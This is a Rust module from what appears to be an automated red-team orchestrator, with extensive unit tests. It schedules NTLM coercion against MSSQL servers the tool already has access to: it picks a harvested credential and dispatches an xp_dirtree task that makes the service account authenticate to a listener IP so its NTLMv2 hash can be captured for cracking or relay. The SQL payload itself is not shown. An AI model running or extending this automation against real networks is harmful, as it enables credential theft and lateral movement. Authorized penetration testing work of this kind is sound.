//! auto_mssql_coercion -- coerce NTLM authentication from MSSQL servers via
//! xp_dirtree/xp_fileexist.
//!
//! When we have MSSQL access (discovered by `auto_mssql_detection`) and a
//! listener IP, we can force the SQL Server service account to authenticate
//! back to our listener, capturing its NTLMv2 hash for cracking or relay.
//!
//! This is distinct from the general `auto_coercion` module which uses
//! PetitPotam/PrinterBug against DCs.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Monitors for MSSQL servers and dispatches xp_dirtree NTLM coercion.
/// Interval: 45s.
pub async fn auto_mssql_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("mssql_coercion") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<MssqlCoercionWork> = {
            let state = dispatcher.state.read().await;
            collect_mssql_coercion_work(&state, &listener)
        };

        for item in work {
            let payload = json!({
                "technique": "mssql_ntlm_coercion",
                "target_ip": item.target_ip,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("mssql_coercion");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        "MSSQL xp_dirtree NTLM coercion dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_MSSQL_COERCION, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_MSSQL_COERCION, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "MSSQL coercion task deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch MSSQL coercion");
                }
            }
        }
    }
}

/// Collect MSSQL coercion work items from the current state.
///
/// Extracted from the async loop so it can be unit-tested without a
/// `Dispatcher` or real async runtime scaffolding.
fn collect_mssql_coercion_work(
    state: &crate::orchestrator::state::StateInner,
    listener: &str,
) -> Vec<MssqlCoercionWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    let mut items = Vec::new();

    for vuln in state.discovered_vulnerabilities.values() {
        if vuln.vuln_type.to_lowercase() != "mssql_access" {
            continue;
        }

        let target_ip = vuln
            .details
            .get("target_ip")
            .and_then(|v| v.as_str())
            .unwrap_or(&vuln.target);

        if target_ip.is_empty() {
            continue;
        }

        let dedup_key = format!("mssql_coerce:{target_ip}");
        if state.is_processed(DEDUP_MSSQL_COERCION, &dedup_key) {
            continue;
        }

        let domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        let cred = state
            .credentials
            .iter()
            .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain.to_lowercase())
            .or_else(|| state.credentials.first())
            .cloned();

        let Some(cred) = cred else {
            continue;
        };

        items.push(MssqlCoercionWork {
            dedup_key,
            target_ip: target_ip.to_string(),
            listener: listener.to_string(),
            credential: cred,
        });
    }

    items
}

struct MssqlCoercionWork {
    dedup_key: String,
    target_ip: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("mssql_coerce:{}", "192.168.58.22");
        assert_eq!(key, "mssql_coerce:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_MSSQL_COERCION, "mssql_coercion");
    }

    #[test]
    fn mssql_access_vuln_type_matching() {
        assert_eq!("mssql_access".to_lowercase(), "mssql_access");
        assert_ne!("smb_signing_disabled".to_lowercase(), "mssql_access");
    }

    #[test]
    fn target_ip_from_vuln_details() {
        let details = serde_json::json!({"target_ip": "192.168.58.22"});
        let target = details
            .get("target_ip")
            .and_then(|v| v.as_str())
            .unwrap_or("fallback");
        assert_eq!(target, "192.168.58.22");
    }

    #[test]
    fn target_ip_fallback_to_vuln_target() {
        let details = serde_json::json!({});
        let fallback = "192.168.58.10";
        let target = details
            .get("target_ip")
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.10");
    }

    #[test]
    fn credential_domain_matching() {
        let domain = "contoso.local".to_string();
        let cred_domain = "CONTOSO.LOCAL";
        let matches = !domain.is_empty() && cred_domain.to_lowercase() == domain.to_lowercase();
        assert!(matches);
    }

    #[test]
    fn credential_domain_empty_no_match() {
        let domain = "".to_string();
        let cred_domain = "contoso.local";
        let matches = !domain.is_empty() && cred_domain.to_lowercase() == domain.to_lowercase();
        assert!(!matches);
    }

    #[test]
    fn mssql_coercion_payload_structure() {
        let payload = serde_json::json!({
            "technique": "mssql_ntlm_coercion",
            "target_ip": "192.168.58.22",
            "listener_ip": "192.168.58.100",
            "credential": {
                "username": "sa",
                "password": "P@ssw0rd!",
                "domain": "contoso.local",
            },
        });
        assert_eq!(payload["technique"], "mssql_ntlm_coercion");
        assert_eq!(payload["target_ip"], "192.168.58.22");
        assert_eq!(payload["listener_ip"], "192.168.58.100");
        assert_eq!(payload["credential"]["username"], "sa");
    }

    #[test]
    fn domain_extraction_from_vuln() {
        let details = serde_json::json!({"domain": "contoso.local"});
        let domain = details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(domain, "contoso.local");

        let details2 = serde_json::json!({});
        let domain2 = details2
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(domain2, "");
    }

    #[test]
    fn mssql_coercion_work_fields() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "sa".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let work = MssqlCoercionWork {
            dedup_key: "mssql_coerce:192.168.58.22".into(),
            target_ip: "192.168.58.22".into(),
            listener: "192.168.58.100".into(),
            credential: cred,
        };
        assert_eq!(work.target_ip, "192.168.58.22");
        assert_eq!(work.listener, "192.168.58.100");
    }

    // --- collect_mssql_coercion_work integration tests ---

    use crate::orchestrator::state::SharedState;

    fn make_cred(user: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}"),
            username: user.into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: domain.into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_vuln(
        id: &str,
        vuln_type: &str,
        target: &str,
        details: serde_json::Value,
    ) -> ares_core::models::VulnerabilityInfo {
        let details_map: std::collections::HashMap<String, serde_json::Value> =
            serde_json::from_value(details).unwrap_or_default();
        ares_core::models::VulnerabilityInfo {
            vuln_id: id.into(),
            vuln_type: vuln_type.into(),
            target: target.into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details: details_map,
            recommended_agent: String::new(),
            priority: 5,
        }
    }

    #[tokio::test]
    async fn collect_empty_state_returns_nothing() {
        let shared = SharedState::new("test".into());
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert!(work.is_empty());
    }

    #[tokio::test]
    async fn collect_no_vulns_with_creds_returns_nothing() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert!(work.is_empty());
    }

    #[tokio::test]
    async fn collect_mssql_access_vuln_produces_work() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22", "domain": "contoso.local"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.22");
        assert_eq!(work[0].listener, "192.168.58.100");
        assert_eq!(work[0].dedup_key, "mssql_coerce:192.168.58.22");
        assert_eq!(work[0].credential.username, "sa");
        assert_eq!(work[0].credential.domain, "contoso.local");
    }

    #[tokio::test]
    async fn collect_skips_non_mssql_vulns() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "smb_signing_disabled",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert!(work.is_empty());
    }

    #[tokio::test]
    async fn collect_dedup_skips_already_processed() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22", "domain": "contoso.local"}),
                ),
            );
            state.mark_processed(DEDUP_MSSQL_COERCION, "mssql_coerce:192.168.58.22".into());
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert!(work.is_empty());
    }

    #[tokio::test]
    async fn collect_target_ip_falls_back_to_vuln_target() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln("v1", "mssql_access", "192.168.58.30", json!({})),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.30");
    }

    #[tokio::test]
    async fn collect_skips_empty_target_ip() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln("v1", "mssql_access", "", json!({"target_ip": ""})),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert!(work.is_empty());
    }

    #[tokio::test]
    async fn collect_prefers_domain_matching_credential() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("admin", "fabrikam.local"));
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22", "domain": "contoso.local"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "sa");
        assert_eq!(work[0].credential.domain, "contoso.local");
    }

    #[tokio::test]
    async fn collect_falls_back_to_first_cred_when_no_domain_match() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("admin", "fabrikam.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22", "domain": "contoso.local"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "admin");
    }

    #[tokio::test]
    async fn collect_falls_back_to_first_cred_when_domain_empty() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "sa");
    }

    #[tokio::test]
    async fn collect_multiple_vulns_produce_multiple_work_items() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22", "domain": "contoso.local"}),
                ),
            );
            state.discovered_vulnerabilities.insert(
                "v2".into(),
                make_vuln(
                    "v2",
                    "mssql_access",
                    "192.168.58.23",
                    json!({"target_ip": "192.168.58.23", "domain": "contoso.local"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 2);
        let ips: std::collections::HashSet<&str> =
            work.iter().map(|w| w.target_ip.as_str()).collect();
        assert!(ips.contains("192.168.58.22"));
        assert!(ips.contains("192.168.58.23"));
    }

    #[tokio::test]
    async fn collect_case_insensitive_vuln_type() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "MSSQL_ACCESS",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
    }

    #[tokio::test]
    async fn collect_case_insensitive_domain_matching() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "CONTOSO.LOCAL"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22", "domain": "contoso.local"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "sa");
    }

    #[tokio::test]
    async fn collect_partial_dedup_only_skips_processed() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22"}),
                ),
            );
            state.discovered_vulnerabilities.insert(
                "v2".into(),
                make_vuln(
                    "v2",
                    "mssql_access",
                    "192.168.58.23",
                    json!({"target_ip": "192.168.58.23"}),
                ),
            );
            state.mark_processed(DEDUP_MSSQL_COERCION, "mssql_coerce:192.168.58.22".into());
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.23");
    }

    #[tokio::test]
    async fn collect_listener_propagated_to_work() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].listener, "192.168.58.50");
    }

    #[tokio::test]
    async fn collect_mixed_vuln_types_only_mssql_access() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln(
                    "v1",
                    "mssql_access",
                    "192.168.58.22",
                    json!({"target_ip": "192.168.58.22"}),
                ),
            );
            state.discovered_vulnerabilities.insert(
                "v2".into(),
                make_vuln(
                    "v2",
                    "constrained_delegation",
                    "192.168.58.23",
                    json!({"target_ip": "192.168.58.23"}),
                ),
            );
            state.discovered_vulnerabilities.insert(
                "v3".into(),
                make_vuln(
                    "v3",
                    "mssql_impersonation",
                    "192.168.58.24",
                    json!({"target_ip": "192.168.58.24"}),
                ),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.22");
    }

    #[tokio::test]
    async fn collect_vuln_with_empty_target_and_no_detail_ip_skipped() {
        let shared = SharedState::new("test".into());
        {
            let mut state = shared.write().await;
            state.credentials.push(make_cred("sa", "contoso.local"));
            state.discovered_vulnerabilities.insert(
                "v1".into(),
                make_vuln("v1", "mssql_access", "", json!({"domain": "contoso.local"})),
            );
        }
        let state = shared.read().await;
        let work = collect_mssql_coercion_work(&state, "192.168.58.100");
        assert!(work.is_empty());
    }
}
